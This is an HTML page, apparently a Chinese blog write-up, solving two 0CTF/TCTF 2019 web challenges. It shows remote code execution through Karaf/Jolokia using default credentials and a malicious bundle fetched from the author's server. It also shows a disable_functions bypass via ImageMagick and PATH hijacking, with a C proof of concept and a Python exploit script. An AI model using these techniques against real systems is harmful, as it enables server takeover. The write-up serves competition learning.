@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>0CTF/TCTF2019 Web题解 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 三月 26日 2019, 6:57 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      9 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="Ghost-pepper"><a href="#Ghost-pepper" class="headerlink" title="Ghost pepper"></a>Ghost pepper</h3><p>题目地址：<a href="http://111.186.63.207:31337/">http://111.186.63.207:31337/</a></p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>一道Java的题目，一开始的验证用karaf&#x2F;karaf就可以过去，然后就进入了漫无止尽的404…在找不到路由的情况下什么都做不了，所以我们第一步就是要去找到后端的路由。</p>
+<p>这里就有点脑洞了，题目Ghost pepper&#x3D;鬼椒&#x3D;Jolokia，而Jolokia是一个JMX连接器，它能让外部通过向其暴露在外的HTTP接口POST JSON的方式来进行访问和修改 JMX 属性、执行 JMX 操作、搜索 MBean、列出 MBean 的 Meta-data 等操作。利用方式参考：<a href="https://www.anquanke.com/post/id/103016%E3%80%81https://www.anquanke.com/post/id/173262%E3%80%82">https://www.anquanke.com/post/id/103016、https://www.anquanke.com/post/id/173262。</a></p>
+<p>结合之前验证的时候提示的Karaf，Karaf则是一个OSGI容器，它可以被用来对bundle进行管理，我们可以通过它来进行bundle的安装和运行，也可以安装插件来实现更多的功能。此时我们可以猜测服务端的搭建流程是先安装了Karaf，然后在Karaf中安装了Jolokia来进行远程管理，所以我们就可以通过Jolokia来对它进行远程访问，通过让它安装恶意bundle然后运行的方式，执行我们的恶意代码。</p>
+<p>还有另外一个更加简单的解法，来自郁离歌师傅：<a href="http://yulige.top/?p=673">http://yulige.top/?p=673</a></p>
+<p>更多的解法：<a href="https://xz.aliyun.com/t/4590#toc-1">https://xz.aliyun.com/t/4590#toc-1</a></p>
+<p>看来Karaf中的功能还是很多的，可以利用的点也很多。</p>
+<p>接下来我们需要知道访问接口时所需要的参数，我们下载源码进行审计，在apache-karaf-4.2.4\bundle\core\src\main\java\org\apache\karaf\bundle\core\internal\BundlesMBeanImpl.java中可以看到：</p>
+<p><img src="/css/images/0CTF2019/2019032604.png" srcset="/img/loading.gif"></p>
+<p>在start bundle的时候会调用它的start函数，所以我们可以编写一个恶意的bundle，在里面实现一个恶意的start方法，然后向服务端POST JSON数据，让服务端安装我们的恶意bundle并执行里面的start方法，就可以getshell了。</p>
+<p>或者也可以像这一篇文章一样，直接调用两个参数的install方法，一步到位：<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p>
+<h4 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h4><ul>
+<li><p>karaf&#x2F;karaf通过验证</p>
+</li>
+<li><p>访问jolokia&#x2F;list得到可以访问的MBean</p>
+</li>
+<li><p>由于提示karaf的原因，将关注点放在karaf上面，可以看到我们能够访问bundle的install和start，当然也可以郁离歌师傅那样，直接调用feature（feature在Karaf中可以用来安装各种工具，安装Jolokia用的就是这个）安装一个webconsole，然后执行命令。<br><img src="/css/images/0CTF2019/2019032602.png" srcset="/img/loading.gif"></p>
+</li>
+<li><p>然后我们使用IDEA来制作一个恶意bundle，具体流程看这里：<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394">https://blog.csdn.net/Love_Taylor/article/details/75194394</a><br><img src="/css/images/0CTF2019/2019032603.png" srcset="/img/loading.gif"></p>
+</li>
+<li><p>将恶意bundle打包成jar文件，然后放到我们的VPS上面。</p>
+</li>
+<li><p>向服务端POST JSON数据，install我们的恶意bundle<br><img src="/css/images/0CTF2019/2019032605.png" srcset="/img/loading.gif"></p>
+</li>
+</ul>
+<p>  从第一个返回包中拿到bundleId，然后POST第二个包，start我们的恶意bundle</p>
+<p><img src="/css/images/0CTF2019/2019032606.png" srcset="/img/loading.gif"></p>
+<p>  getshell<br><img src="/css/images/0CTF2019/2019032607.png" srcset="/img/loading.gif"></p>
+<h4 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h4><p>我使用的环境是docker搭建的Ubuntu18.04，Karaf可以去它的官网进行下载：<a href="http://karaf.apache.org/download.html">http://karaf.apache.org/download.html</a></p>
+<p>要注意的是Karaf的各个版本对Java版本的支持不一，我下载的是Karaf Runtime 4.1.7的版本，然后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install openjdk-8-jdk # 安装jdk8</span><br><span class="line">tar xvf apache-karaf-4.1.7.tar.gz # 解包</span><br></pre></td></tr></table></figure>
+
+<p>在Karaf中安装Jolokia的方式可以看这里：<a href="https://karaf.apache.org/manual/latest/#_jmx_http_bridge_with_jolokia">https://karaf.apache.org/manual/latest/#_jmx_http_bridge_with_jolokia</a> ，这样搭建起来的就跟题目基本一样了，MBean的数量也差不多，访问时候的验证可以用karaf&#x2F;karaf的默认账号密码，验证通过就有了管理员权限，就可以为所欲为了（比如安装webconsole）。</p>
+<p>如果安装失败也可以看看其他版本的手册，比如<a href="https://karaf.apache.org/manual/latest-3.0.x/monitoring">https://karaf.apache.org/manual/latest-3.0.x/monitoring</a> ，这种方法跟上一种不同的是访问Jolokia没有账号密码的验证（如果要访问webconsole才需要验证），环境和题目稍有不同，可以访问的MBean要少一些，不过不影响解题。</p>
+<p>这样看来webconsole可能像是个非预期解？访问8181端口就可以看到环境成功地搭建起来了：</p>
+<p><img src="/css/images/0CTF2019/2019032601.png" srcset="/img/loading.gif"></p>
+<hr>
+<h3 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h3><p>题目地址：<a href="http://111.186.63.208:31340/">http://111.186.63.208:31340/</a></p>
+<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>按照题目的提示，流程就是利用ImageMagick的漏洞绕过PHP的disable_functions，来执行根目录下的readflag程序。题目除了disable_functions之外还做了open_basedir的限制：</p>
+<p><img src="/css/images/0CTF2019/2019032608.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/0CTF2019/2019032609.png" srcset="/img/loading.gif"></p>
+<p>在寻找漏洞之前，我们可以先看一下16年的ImageMagick漏洞详情：<a href="https://www.2cto.com/article/201605/505823.html">https://www.2cto.com/article/201605/505823.html</a></p>
+<p>漏洞原因是ImageMagick在处理文件的时候，底层会使用system或者execve调用相应的二进制程序来实现功能，而因为对输入变量的处理不够妥善，就导致了命令注入漏洞。新版本的ImageMagick则通过两种或更多的方式来修复了：禁止了一些delegate、在处理输入输出前先创建随机文件名的文件副本。</p>
+<p>现在命令注入是行不通了，但是还有一个问题，观察delegate的command，ImageMagick在调用二进制文件的时候，似乎没有写上他们的绝对路径？我们选用第一个delegate（delegate decode&#x3D;”bpg” command&#x3D;”&quot;@BPGDecodeDelegate@&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; @MVDelegate@ &quot;%o.png&quot; &quot;%o&quot;”），用strace调试一下看看，命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f php Twings.php 2&gt;&amp;1 | grep bpgdec</span><br></pre></td></tr></table></figure>
+
+<p>Twings.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$image = new Imagick(&#x27;Sun.bpg&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[pid 10755] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&#x27;bpgdec&#x27; -b 16 -o &#x27;/tmp/magick-1&quot;...], 0x559d47e52e70 /* 9 vars */) = 0</span><br><span class="line">[pid 10755] stat(&quot;/usr/local/sbin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] stat(&quot;/usr/local/bin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] stat(&quot;/usr/sbin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] stat(&quot;/usr/bin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] stat(&quot;/sbin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] stat(&quot;/bin/bpgdec&quot;, 0x7ffd4b62d880) = -1 ENOENT (No such file or directory)</span><br><span class="line">[pid 10755] write(2, &quot;bpgdec: not found&quot;, 17bpgdec: not found) = 17</span><br></pre></td></tr></table></figure>
+
+<p>所以我们就有那么一个思路：通过覆盖PATH环境变量的方式，来让ImageMagick执行我们的恶意二进制文件。我们再试试：</p>
+<p>poc.c，gcc编译一下命名为bpgdec：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;/bin/ls -al / &gt; /tmp/Pwn&quot;);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Twings.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;PATH=/tmp&quot;);</span><br><span class="line">$image = new Imagick(&#x27;Sun.bpg&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行php Twings.php，可以看到：</p>
+<p><img src="/css/images/0CTF2019/2019032610.png" srcset="/img/loading.gif"></p>
+<p>成功了！</p>
+<p>更多的解法，利用LD_PRELOAD环境变量+调用execve的PHP函数：</p>
+<p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p>一叶飘零师傅的改进版：<a href="https://www.anquanke.com/post/id/175403#h2-0">https://www.anquanke.com/post/id/175403#h2-0</a></p>
+<p>绕过open_basedir读文件：</p>
+<p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p>
+<h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>直接贴脚本，我使用的是第二个delegate（delegate decode&#x3D;”png” encode&#x3D;”bpg” command&#x3D;”&quot;@BPGEncodeDelegate@&quot; -b 12 -sstdout&#x3D;%%stderr &quot;%Q&quot; -o &quot;%o&quot; &quot;%i&quot;”），即调用了bpgenc的delegate：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://111.186.63.208:31340/&quot;</span><br><span class="line">evil = open(&quot;bpgenc&quot;, &quot;rb&quot;).read()</span><br><span class="line">evil = base64.b64encode(evil)</span><br><span class="line">php = &quot;putenv(&#x27;PATH=/tmp/40f955f039eabe222958ff57ac1bfdbb&#x27;);&quot; \</span><br><span class="line">      &quot;file_put_contents(&#x27;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&#x27;, base64_decode(&#x27;&quot; + evil + &quot;&#x27;));&quot; \</span><br><span class="line">      &quot;chmod(&#x27;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&#x27;, 0777);&quot; \</span><br><span class="line">      &quot;$image = new Imagick(&#x27;http://*.*.*.*/sun.png&#x27;);&quot; \</span><br><span class="line">      &quot;$image -&gt; writeImage(&#x27;/tmp/40f955f039eabe222958ff57ac1bfdbb/a.bpg&#x27;);&quot; \</span><br><span class="line">      &quot;echo file_get_contents(&#x27;/tmp/40f955f039eabe222958ff57ac1bfdbb/Pwn&#x27;);&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;backdoor&quot;: php</span><br><span class="line">&#125;</span><br><span class="line">print requests.post(url, data=data).content</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/css/images/0CTF2019/2019032611.png" srcset="/img/loading.gif"></p>
+<h4 id="本地环境搭建-1"><a href="#本地环境搭建-1" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h4><p>同样的docker+Ubuntu18.04，因为要进行调试的原因，所以我使用了–security-opt参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name php --security-opt seccomp=unconfined -p 32770:80 ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>apt装好就完事了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php php-fpm php-imagick nginx strace vim</span><br></pre></td></tr></table></figure>
+
+<p>然后修改&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default开启php-fpm支持，直接将下方的注释修改一下就好，index中加不加index.php都没有关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">                include snippets/fastcgi-php.conf;</span><br><span class="line">        #</span><br><span class="line">        #       # With php-fpm (or other unix sockets):</span><br><span class="line">                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;</span><br><span class="line">        #       # With php-cgi (or other tcp sockets):</span><br><span class="line">        #       fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后修改&#x2F;etc&#x2F;php&#x2F;7.2&#x2F;fpm&#x2F;php.ini，把disable_functions和open_basedir加上去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open_basedir = /var/www/html:/tmp/40f955f039eabe222958ff57ac1bfdbb</span><br><span class="line">disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>
+
+<p>最后在tmp下面新建自己的沙盒，然后启动nginx和php-fpm即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br><span class="line">service php7.2-fpm start</span><br></pre></td></tr></table></figure>
+
+<p>然后可以自行写一个phpinfo来测试一下配置~</p>
+<hr>
+<p>Orz</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Karaf/">Karaf</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/03/28/0CTF-TCTF-Crypto%E5%AD%A6%E4%B9%A0/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>0CTF/TCTF2019 Crypto学习</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/03/22/%E5%88%92%E6%B0%B4CVE-2019-9194%E5%A4%8D%E7%8E%B0/">
+                        <span>划水CVE-2019-9194复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "0CTF/TCTF2019 Web题解&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
